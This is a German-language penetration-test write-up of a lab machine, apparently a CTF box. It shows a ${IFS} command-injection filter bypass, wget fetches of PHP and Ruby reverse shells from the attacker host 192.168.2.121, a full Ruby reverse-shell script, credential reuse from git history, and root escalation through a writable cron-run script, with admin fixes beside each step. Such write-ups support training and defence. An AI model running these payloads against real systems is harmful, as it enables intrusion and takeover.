+GET /index.php?poem=<span class="command">cat%20/home/minnie/.ssh/id_rsa</span> HTTP/1.1
+<span class="password"># RCE detected (Anwendung erkennt/blockiert 'cat'?)</span>
+
+Bypass Versuch 1:
+GET /index.php?poem=<span class="command">;whereis${IFS}nc</span> HTTP/1.1
+Antwort enthält: <span class="command">nc: /bin/nc /bin/nc.openbsd ...</span> <span class="password"><-- RCE funktioniert mit ${IFS} Bypass!</span>
+
+Bypass Versuch 2 (Datei-Download via wget):
+GET /index.php?poem=<span class="command">poem1;wget${IFS}-${IFS}/tmp/rev.php${IFS}http://192.168.2.121:8000/rev.php</span> HTTP/1.1
+<span class="password"># Erfolgreicher Download von rev.php auf Zielsystem (siehe HTTP-Server Logs unten)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es werden verschiedene Versuche unternommen, die LFI zur RCE zu eskalieren:
+            <ul>
+                <li>Einfache Command Injection (`poem=;id`) scheitert.</li>
+                <li>Versuch, `cat` direkt auszuführen (`poem=cat ...`), wird anscheinend erkannt ("Rce detected").</li>
+                <li>Ein Bypass-Versuch mit `${IFS}` (Internal Field Separator) anstelle von Leerzeichen funktioniert! `poem=;whereis${IFS}nc` führt den `whereis nc`-Befehl erfolgreich aus.</li>
+                <li>Ein weiterer erfolgreicher Bypass: Mit `poem=poem1;wget${IFS}...` wird `wget` ausgeführt, um eine Datei (`rev.php`) vom Angreifer-Server herunterzuladen und unter `/tmp/rev.php` auf dem Ziel zu speichern.</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Command Injection ist möglich! Die Anwendung scheint einfache Befehle oder Zeichenketten wie `cat` zu filtern, aber durch die Verwendung von `${IFS}` als Leerzeichenersatz kann der Filter umgangen werden. Die Möglichkeit, Dateien mit `wget` herunterzuladen, öffnet den Weg zum Hochladen und Ausführen einer Reverse Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            1. Erstellen Sie ein PHP-Reverse-Shell-Skript (`rev.php` oder `rs.php`) auf Ihrem Angreifer-Webserver (<span class="command">192.168.2.121</span>).
+            2. Verwenden Sie den `wget`-Bypass, um dieses Skript nach `/tmp` auf dem Ziel herunterzuladen: `curl 'http://192.168.2.117/index.php?poem=poem1;wget${IFS}-O${IFS}/tmp/rs.php${IFS}http://192.168.2.121:8000/rs.php'` (Parameter `-O` statt `-` verwenden).
+            3. Starten Sie einen Netcat-Listener auf Ihrem Angreifer-System.
+            4. Führen Sie das heruntergeladene Skript über die Command Injection aus: `curl 'http://192.168.2.117/index.php?poem=poem1;php${IFS}/tmp/rs.php'`
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die zugrundeliegende Schwachstelle (wahrscheinlich ein unsicherer `include()` oder `system()`/`exec()`-Aufruf) in `index.php`. Implementieren Sie eine robuste Filterung gegen Command Injection, die auch Bypässe wie `${IFS}` berücksichtigt. Vermeiden Sie die Ausführung von Shell-Befehlen basierend auf Benutzereingaben generell.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">python3 -m http.server</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.117 - - [08/Nov/2022 16:13:46] code 404, message File not found</span>
+<span class="password">192.168.2.117 - - [08/Nov/2022 16:13:46] "GET /rs.php HTTP/1.1" 404 -</span> <span class="password"><-- Früherer Versuch?</span>
+<span class="password">192.168.2.117 - - [08/Nov/2022 16:13:57] "GET /rev.php HTTP/1.1" 200 -</span> <span class="password"><-- Erfolgreicher Download</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System (<span class="command">192.168.2.121</span>) wird ein Python-HTTP-Server gestartet. Die Logs zeigen einen fehlgeschlagenen Versuch, `rs.php` herunterzuladen (404), gefolgt von einem erfolgreichen Download von `rev.php` (200) durch das Zielsystem (<span class="command">192.168.2.117</span>).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der `wget`-Befehl über die Command Injection funktioniert hat und die Reverse-Shell-Payload (`rev.php`) erfolgreich auf das Zielsystem übertragen wurde (vermutlich nach `/tmp`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun das heruntergeladene Skript aus.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, außer der Behebung der RCE-Lücke.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/git]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/git]
+└─# <span class="command">curl 'http://192.168.2.117/index.php?poem=poem1;php${IFS}/tmp/rs.php'</span></div> <span class="password"><-- Sollte /tmp/rev.php sein?</span>
+                     <pre>[Keine Ausgabe von curl erwartet]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/git]
+└─# <span class="command"># Eingehende Verbindung</span></div>
+                    <div class="terminal"> <span class="password"><-- Format angepasst</span>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.117] 42820</span>
+Linux rubies 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 23:36:22 up  1:46,  0 users,  load average: 0.00, 0.00, 0.15
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ <span class="password"># Shell erhalten!</span>
+</pre>
+                    </div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 9001 gestartet. Dann wird die Command Injection Schwachstelle erneut ausgenutzt, diesmal um den PHP-Interpreter (`php`) auf das zuvor heruntergeladene Skript (`/tmp/rs.php` - wahrscheinlich ein Tippfehler, sollte `/tmp/rev.php` sein) anzuwenden. Der `${IFS}`-Bypass wird wieder verwendet. Der Netcat-Listener empfängt erfolgreich die Verbindung vom Zielsystem, und der Angreifer erhält eine Shell als Benutzer `www-data`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Eine interaktive Shell wurde durch Ausnutzung der Command Injection Schwachstelle erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell stabilisieren (`python...`, `export TERM...`). Mit der Enumeration als `www-data` beginnen.<br><strong>Empfehlung (Admin):</strong> RCE-Lücke beheben.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept: Remote Code Execution via Command Injection Bypass</h2>
+
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Die Webanwendung `index.php` auf `http://192.168.2.117` ist anfällig für Command Injection über den GET-Parameter `poem`. Obwohl einfache Befehle oder Zeichenketten (wie `cat`) möglicherweise gefiltert werden, kann dieser Filter durch die Verwendung von `${IFS}` (Internal Field Separator) anstelle von Leerzeichen umgangen werden. Dies erlaubt die Ausführung beliebiger Shell-Befehle im Kontext des Webserver-Benutzers (`www-data`). Die Schwachstelle wird ausgenutzt, um mittels `wget` (mit `${IFS}`-Bypass) eine PHP-Reverse-Shell vom Angreifer-Server herunterzuladen und anschließend mit `php` (ebenfalls mit `${IFS}`-Bypass) auszuführen.</p>
+
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                     <li>Netzwerkzugriff auf das Zielsystem `http://192.168.2.117`.</li>
+                     <li>Ein vom Angreifer kontrollierter Webserver zum Hosten der Reverse-Shell-Payload.</li>
+                     <li>Ein Netcat-Listener auf dem Angreifer-System.</li>
+                     <li>Die Command Injection Schwachstelle im `poem`-Parameter von `index.php`, einschließlich der Möglichkeit des `${IFS}`-Bypasses.</li>
+                     <li>`wget` und `php` müssen auf dem Zielsystem verfügbar und für `www-data` ausführbar sein.</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                     <li>
+                         <strong>Reverse Shell Payload vorbereiten (Angreifer-Server):</strong>
+                         Erstellen Sie eine PHP-Reverse-Shell (z.B. `rev.php`), die sich zu Ihrer IP (<span class="command">192.168.2.121</span>) und einem Port (z.B. <span class="command">9001</span>) verbindet. Starten Sie einen HTTP-Server, um sie bereitzustellen.
+                        <div class="code-block">
+                             <div class="terminal">
+                                 <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 8000</span></div>
+                                 <pre>Serving HTTP on 0.0.0.0 port 8000 ...</pre>
+                             </div>
+                        </div>
+                    </li>
+                     <li>
+                         <strong>Listener starten (Angreifer-Server):</strong>
+                         Starten Sie einen Netcat-Listener auf dem gewählten Port.
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                                 <pre>listening on [any] 9001 ...</pre>
+                             </div>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>Payload herunterladen (via RCE):</strong>
+                        Senden Sie einen präparierten Request an `index.php`, um die Reverse Shell mit `wget` herunterzuladen (verwenden Sie `%20` oder `${IFS}` für Leerzeichen).
+                         <div class="code-block">
+                             <div class="terminal">
+                                 <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://192.168.2.117/index.php?poem=poem1;wget${IFS}-O${IFS}/tmp/rev.php${IFS}http://192.168.2.121:8000/rev.php'</span></div>
+                                 <pre>[Keine Ausgabe erwartet]</pre>
+                             </div>
+                        </div>
+                         Überprüfen Sie die HTTP-Server-Logs auf dem Angreifer-System, um den erfolgreichen Download zu bestätigen.
+                    </li>
+                    <li>
+                        <strong>Payload ausführen (via RCE):</strong>
+                         Senden Sie einen weiteren präparierten Request, um das heruntergeladene PHP-Skript auszuführen.
+                         <div class="code-block">
+                             <div class="terminal">
+                                 <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://192.168.2.117/index.php?poem=poem1;php${IFS}/tmp/rev.php'</span></div>
+                                 <pre>[Keine Ausgabe erwartet]</pre>
+                             </div>
+                        </div>
+                    </li>
+                     <li>
+                         <strong>Shell empfangen (Angreifer-Listener):</strong>
+                         Der Netcat-Listener sollte nun eine eingehende Verbindung vom Zielserver anzeigen.
+                        <div class="code-block">
+                             <div class="terminal">
+                                <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.117] 42820</span>
+[...]
+$ <span class="password"># Shell erhalten</span></pre>
+                            </div>
+                        </div>
+                    </li>
+                </ol>
+            </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Eine interaktive Reverse Shell auf dem Zielsystem, ausgeführt mit den Rechten des `www-data`-Benutzers.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Die erfolgreiche eingehende Verbindung im Netcat-Listener und die Möglichkeit, Befehle in der erhaltenen Shell auszuführen.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Command Injection Schwachstellen, insbesondere wenn Filter umgangen werden können, erlauben Angreifern die vollständige Kontrolle über den ausführenden Prozess, was zu Datendiebstahl, Systemmanipulation und weiterer Eskalation führt.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                <ul>
+                     <li>**Command Injection beheben:** Die zugrundeliegende Funktion (wahrscheinlich `include()`, `eval()`, `system()`, `exec()` etc. in `index.php`) muss sicher implementiert werden. Benutzereingaben dürfen niemals direkt oder ohne strikte Validierung/Bereinigung an solche Funktionen übergeben werden.</li>
+                     <li>**Filter verbessern (als Übergangslösung):** Wenn eine sofortige Code-Änderung nicht möglich ist, verbessern Sie die Filterung, um Bypässe wie `${IFS}` zu erkennen und zu blockieren. Dies ist jedoch keine dauerhafte Lösung.</li>
+                     <li>**Web Application Firewall (WAF):** Eine WAF kann helfen, Command Injection Angriffe zu erkennen und zu blockieren.</li>
+                     <li>**Least Privilege:** Führen Sie den Webserver-Prozess mit minimal notwendigen Rechten aus.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@rubies:/tmp$ <span class="command">grep password $(locate -r txt$)</span></div>
+                    <pre>
+/usr/share/vim/vim74/doc/os_vms.txt:	- handle <,> characters and passwords in directory definition
+/usr/share/vim/vim74/doc/os_vms.txt:	- handle internode/remote invocation and editing with passwords
+/usr/share/vim/vim74/doc/pi_netrw.txt:	machine HSTNAME login USERID password "PASSWRD"
+</pre>
+                    <div class="prompt">www-data@rubies:/tmp$ <span class="command">cat /home/minnie/note.txt</span></div>
+                    <pre>
+Put anything you'd like to in the folder,
+do not do dumb stuff pls
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` werden zwei Enumerationsschritte durchgeführt:
+            1.  `grep password $(locate -r txt$)`: Sucht rekursiv nach dem Wort "password" in allen Dateien, die auf `.txt` enden und von `locate` gefunden werden. Die Ergebnisse stammen aus Vim-Dokumentationsdateien und sind nicht relevant.
+            2.  `cat /home/minnie/note.txt`: Zeigt eine Notiz im Home-Verzeichnis des vermuteten Benutzers `minnie`, die das Ablegen von Dateien in "dem Ordner" erlaubt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Passwortsuche war erfolglos. Die Notiz ist interessant: Welcher Ordner ist gemeint? Und warum darf `www-data` die Notiz von `minnie` lesen? Dies könnte auf unsichere Berechtigungen oder einen spezifischen Mechanismus hindeuten. Der wichtigste nächste Schritt fehlt jedoch im Log: `sudo -l` für `www-data`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `sudo -l` aus, um die `sudo`-Berechtigungen von `www-data` zu prüfen. Untersuchen Sie die Berechtigungen von `/home/minnie`. Suchen Sie nach dem in `note.txt` erwähnten Ordner.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Home-Verzeichnisse und Notizdateien korrekte Berechtigungen haben. `locate`-Datenbank aktuell halten oder ggf. deaktivieren, wenn sie sensible Pfade preisgeben könnte.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command"># Implizierte Analyse der Git-Historie (wie zuvor gezeigt)</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/gitex]
+└─# <span class="command">diff a/index.php b/index.php</span></div>
+                     <pre>
+10a11,37
+>
+> // we dont need a login page dangit minnie! follow my orders pls
+> $servername = "localhost";
+> $username = "root";
+> $password = "<span class="password">jd92khn49w</span>"; <span class="password"><-- Passwort wiederholt gefunden</span>
+> [...] <span class="password"># Restlicher Datenbank-Code</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt wiederholt den `diff`-Befehl auf die extrahierten Git-Commits, der das MySQL-Passwort `<span class="password">jd92khn49w</span>` aufdeckt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erneute Bestätigung des Passwortfunds aus der Git-Historie. Dieses Passwort ist der wahrscheinlichste Kandidat für den Benutzer `minnie`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `su minnie` und dem Passwort `<span class="password">jd92khn49w</span>` anzumelden.<br><strong>Empfehlung (Admin):</strong> Siehe Empfehlungen zur sicheren Speicherung von Zugangsdaten und Bereinigung der Git-Historie.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@rubies:/tmp$ <span class="command">su minnie</span></div>
+                     <pre>:::::::::::::::::::::::::::::::::
+Password:</pre>
+                     <div class="prompt"># <span class="command">[Passworteingabe: jd92khn49w]</span></div>
+                     <pre>:::::::::::::::::::::::::::::::::
+irb(main):001:0> <span class="password"># Erfolg! IRB-Shell erhalten</span></pre>
+                     <div class="prompt">irb(main):001:0> <span class="command">exec '/bin/bash'</span></div>
+                     <pre>minnie@rubies:/tmp$ <span class="password"># Bash-Shell als minnie</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su minnie` wird ausgeführt. Das aus der Git-Historie gefundene Passwort `<span class="password">jd92khn49w</span>` wird eingegeben. Der Login ist erfolgreich, landet aber in einer Interactive Ruby Shell (`irb`). Mit `exec '/bin/bash'` wird die IRB-Shell durch eine Bash-Shell ersetzt, die nun als Benutzer `minnie` läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation von `www-data` zu `minnie` erfolgreich durchgeführt durch Wiederverwendung des im Git-Repository gefundenen Passworts.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie nun als `minnie`. Prüfen Sie `sudo -l`, untersuchen Sie das Home-Verzeichnis `/home/minnie` und den in `note.txt` erwähnten Ordner genauer.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie Passwort-Wiederverwendung. Ändern Sie das kompromittierte Passwort.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">minnie@rubies:/tmp$ <span class="command">sudo -l</span></div>
+                    <pre>[sudo] password for minnie:</pre> <span class="password"><-- Passwort wird benötigt</span>
+                    <div class="prompt"># <span class="command">[Passworteingabe: jd92khn49w]</span></div>
+                    <pre>Sorry, user minnie may not run sudo on rubies.</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `minnie` wird `sudo -l` ausgeführt. Nach Eingabe des Passworts (`jd92khn49w`) wird angezeigt, dass `minnie` keine `sudo`-Berechtigungen hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sudo` ist kein direkter Eskalationsweg für `minnie`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Vektoren: SUID-Binaries, Cronjobs, unsichere Dateiberechtigungen, Kernel-Exploits. Untersuchen Sie den Ordner aus `note.txt`.<br><strong>Empfehlung (Admin):</strong> Korrekte `sudo`-Konfiguration.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">minnie@rubies:/home/minnie$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">H0wc00l_i5_Byp@@s1n9</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als `minnie` wird die Datei `user.txt` im Home-Verzeichnis gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wurde gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag dokumentieren. Konzentration auf Root-Eskalation.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">minnie@rubies:/home/minnie$ <span class="command"># Untersuchung von /opt/cleaning gemäß note.txt (impliziert)</span></div>
+                     <div class="prompt">minnie@rubies:/home/minnie$ <span class="command">cd /opt/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">minnie@rubies:/opt$ <span class="command">ls -la</span></div>
+                     <pre>
+drwxr-xr-x  3 root root   4096 Nov  2  2020 .
+drwxr-xr-x 23 root root   4096 Nov  2  2020 ..
+drwxrwxr-x  2 root <span class="command">minnie</span> 4096 Nov  2  2020 <span class="command">cleaning</span> <span class="password"><-- Gruppe minnie hat Schreibrechte!</span>
+</pre>
+                    <div class="prompt">minnie@rubies:/opt$ <span class="command">cd cleaning/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">minnie@rubies:/opt/cleaning$ <span class="command">ls -la</span></div>
+                     <pre>
+drwxrwxr-x 2 root <span class="command">minnie</span> 4096 Nov  2  2020 .
+drwxr-xr-x 3 root root   4096 Nov  2  2020 ..
+-rw-r--r-- 1 root root    108 Nov  2  2020 <span class="command">webserver_upload.rb</span> <span class="password"><-- Ruby-Skript</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Basierend auf der `note.txt` wird das Verzeichnis `/opt/cleaning` untersucht. Die Berechtigungen (`drwxrwxr-x`) zeigen, dass die Gruppe `minnie` Schreibrechte in diesem Verzeichnis hat. Innerhalb des Verzeichnisses befindet sich ein Ruby-Skript namens `webserver_upload.rb`, das `root` gehört.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein potenzieller Privilege Escalation Vektor. Wenn ein Prozess mit Root-Rechten (z.B. ein Cronjob) das Skript `webserver_upload.rb` ausführt oder Dateien in diesem Verzeichnis verarbeitet, könnte `minnie` dies durch Modifizieren von Dateien oder Erstellen neuer Dateien im Verzeichnis `/opt/cleaning` ausnutzen. Da `minnie` Schreibrechte im Verzeichnis hat, kann sie das Skript `webserver_upload.rb` überschreiben.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Finden Sie heraus, ob und wann `webserver_upload.rb` ausgeführt wird (z.B. durch Überprüfung der Cronjobs: `cat /etc/crontab /etc/cron.*/*`, Prozess-Monitoring: `pspy`). Wenn es als Root ausgeführt wird, ersetzen Sie den Inhalt von `webserver_upload.rb` durch eine Ruby-Reverse-Shell, die sich zu Ihrem Listener verbindet.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Berechtigungen von `/opt/cleaning`. Verzeichnisse, die von Root-Prozessen verwendete Skripte enthalten, sollten nicht für unprivilegierte Benutzer oder Gruppen schreibbar sein. Stellen Sie sicher, dass Cronjobs sicher sind und Skripte nicht manipuliert werden können.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Auf Angreifer-System: Ruby Reverse Shell vorbereiten (impliziert)</span></div>
+                    <div class="prompt"># <span class="command">vi rbshell.rb</span></div>
+                    <pre>
+#!/usr/bin/env ruby
+require 'socket'
+s = Socket.new 2,1
+s.connect Socket.sockaddr_in <span class="command">2234</span>, '<span class="command">192.168.2.121</span>' <span class="password"><-- Angreifer IP & Port</span>
+[0,1,2].each { |fd| syscall 33, s.fileno, fd } <span class="password"><-- Dup2 für Shell I/O Redirection</span>
+exec '/bin/sh -i'
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Ruby-Skript für eine Reverse Shell wird vorbereitet. Es stellt eine TCP-Verbindung zum Angreifer (<span class="command">192.168.2.121</span>) auf Port <span class="command">2234</span> her, leitet Standard-Input, -Output und -Error auf den Socket um (`syscall 33` ist `dup2` auf 64bit Linux) und startet dann eine interaktive Shell (`/bin/sh -i`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardmäßige Ruby-Reverse-Shell, bereit zur Übertragung auf das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Übertragen Sie dieses Skript auf das Zielsystem (z.B. mit `wget` von einem Python HTTP Server) in das Verzeichnis `/opt/cleaning` und überschreiben Sie damit `webserver_upload.rb`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">minnie@rubies:/opt/cleaning$ <span class="command">wget http://192.168.2.121:8000/rshell.rb</span></div>
+                     <pre>
+[...]
+2022-11-09 00:29:54 (107 MB/s) - ‘rshell.rb’ saved [270/270]
+</pre>
+                     <div class="prompt">minnie@rubies:/opt/cleaning$ <span class="command">ls</span></div>
+                     <pre>rshell.rb  webserver_upload.rb</pre>
+                     <div class="prompt">minnie@rubies:/opt/cleaning$ <span class="command">mv rshell.rb webserver_upload.rb</span></div>
+                     <pre>mv: replace 'webserver_upload.rb', overriding mode 0644 (rw-r--r--)? <span class="command">y</span></pre>
+                     <div class="prompt">minnie@rubies:/opt/cleaning$ <span class="command">ls -la</span></div> <span class="password"><-- ll ist Alias</span>
+                     <pre>
+total 12
+drwxrwxr-x 2 root   minnie 4096 Nov  9 00:30 ./
+drwxr-xr-x 3 root   root   4096 Nov  2  2020 ../
+-rw-rw-r-- 1 <span class="command">minnie minnie</span>  270 Nov  9 00:29 <span class="command">webserver_upload.rb</span> <span class="password"><-- Überschrieben, gehört jetzt minnie</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das vorbereitete Ruby-Reverse-Shell-Skript (`rshell.rb`) wird vom Angreifer-Server heruntergeladen. Anschließend wird die ursprüngliche Datei `webserver_upload.rb` mit dem heruntergeladenen Skript überschrieben (`mv`). Wichtig: Die neue Datei gehört nun `minnie`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das für die Eskalation vorgesehene Skript wurde erfolgreich durch die Reverse-Shell-Payload ersetzt. Nun muss gewartet werden, bis der (vermutete) Root-Prozess dieses Skript ausführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Ihrem System auf Port <span class="command">2234</span> und warten Sie auf die eingehende Verbindung, die ausgelöst wird, wenn der Cronjob oder der überwachende Prozess das manipulierte Skript ausführt.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen an kritischen Skripten. Stellen Sie sicher, dass Prozesse, die Skripte ausführen, deren Integrität prüfen oder sicherstellen, dass sie nicht von unprivilegierten Benutzern geändert werden können.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nc -lvnp 2234</span></div>
+                     <pre>listening on [any] 2234 ...</pre>
+                     <div class="prompt"># <span class="command">Nach einiger Wartezeit (z.B. 30 Sekunden / nächster Cron-Lauf)</span></div>
+                     <div class="terminal"> <span class="password"><-- Format angepasst</span>
+                     <pre>
+listening on [any] 2234 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.117] 51604</span>
+/bin/sh: 0: can't access tty; job control turned off
+# <span class="password"># Root-Shell erhalten!</span>
+</pre>
+                    </div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener wird auf Port 2234 gestartet. Nach einer Wartezeit (impliziert, dass ein automatisierter Prozess das Skript auslöst) geht eine Verbindung vom Zielsystem ein, und der Angreifer erhält eine Shell. Der Prompt `#` deutet darauf hin, dass es sich um eine Root-Shell handelt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation zu `root` erfolgreich! Der Angreifer hat das System vollständig übernommen, indem er ein Skript in einem schreibbaren Verzeichnis überschrieben hat, das von einem Root-Prozess ausgeführt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff ist erreicht. Suchen Sie die Root-Flag (`root.txt`).<br><strong>Empfehlung (Admin):</strong> Identifizieren und beheben Sie den Cronjob oder Prozess, der das Skript in `/opt/cleaning` unsicher ausführt. Korrigieren Sie die Verzeichnisberechtigungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">ls -li</span></div>
+                    <pre>
+total 8
+<span class="command">20552</span> -rw-r--r-- 1 root root 217 Nov  2  2020 bundle.rb
+<span class="command">18464</span> -rw------- 1 root root  15 Nov  2  2020 ​<span class="password">root.txt</span> <span class="password"><-- Dateiname mit unsichtbarem Zeichen?</span>
+</pre>
+                    <div class="prompt"># <span class="command">cat root.txt</span></div>
+                    <pre>cat: root.txt: <span class="password">No such file or directory</span></pre>
+                    <div class="prompt"># <span class="command">find / -inum 18464 -exec cat {} \;</span></div>
+                    <pre><span class="password">pyth0N>r00bi35</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird versucht, `root.txt` zu lesen. `ls -li` zeigt die Datei zusammen mit ihrer Inode-Nummer (<span class="command">18464</span>) an, aber `cat root.txt` schlägt fehl ("No such file or directory"). Dies deutet darauf hin, dass der Dateiname unsichtbare Zeichen oder Leerzeichen enthält. Mit `find / -inum 18464 -exec cat {} \;` wird die Datei anhand ihrer Inode-Nummer gefunden und ihr Inhalt erfolgreich ausgegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde gefunden und gelesen. Die Schwierigkeit lag im ungewöhnlichen Dateinamen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag dokumentieren. Die Verwendung von Inode-Nummern ist ein guter Trick, um auf Dateien mit problematischen Namen zuzugreifen.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie ungewöhnliche Zeichen in Dateinamen. Sorgen Sie für konsistente Benennung.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">H0wc00l_i5_Byp@@s1n9</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt (via Inode)</div>
+                    <div class="flag-value"><span class="password">pyth0N>r00bi35</span></div> <!-- Maskiert > -->
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 8. November 2022</p> <!-- Korrektes Datum aus Nmap/Nikto extrahiert -->
+    </footer>
+</body>
+</html>
